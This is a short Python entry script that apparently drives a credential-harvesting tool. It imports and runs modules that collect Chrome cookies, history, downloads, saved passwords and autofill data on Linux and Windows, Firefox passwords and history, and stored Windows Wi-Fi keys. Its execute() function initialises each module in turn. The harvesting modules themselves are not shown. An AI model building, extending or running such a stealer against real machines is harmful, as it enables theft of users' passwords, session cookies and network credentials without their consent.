#!/usr/local/bin/python
# coding: utf-8

import time

from modules.linux.chrome.cookie import LinuxChromeCookie
from modules.linux.chrome.download import LinuxChromeDownload
from modules.linux.chrome.history import LinuxChromeHistory
from modules.linux.chrome.db_password import LinuxChromeDbPassword
from modules.linux.chrome.keyring_password import LinuxChromeKeyringPassword


from modules.windows.chrome.password import WindowsChromePassword
from modules.windows.chrome.history import WindowsChromeHistory
from modules.windows.chrome.download import WindowsChromeDownload
from modules.windows.chrome.cookie import WindowsChromeCookie
from modules.windows.chrome.saved_data import WindowsChromeSavedData

from modules.windows.firefox.password import WindowsFirefoxPassword
from modules.windows.firefox.history import WindowsFirefoxHistory

from modules.windows.wifi import WindowsWifi


modules = [
		LinuxChromeCookie(),
		LinuxChromeHistory(),
		LinuxChromeDownload(),
		LinuxChromeDbPassword(),
		LinuxChromeKeyringPassword(),

		WindowsChromePassword(),
		WindowsChromeHistory(),
		WindowsChromeDownload(),
		WindowsChromeCookie(),
		WindowsChromeSavedData(),

		WindowsFirefoxPassword(),
		WindowsFirefoxHistory(),

		WindowsWifi(),
	]


def execute():
	for module in modules:
		module.init()
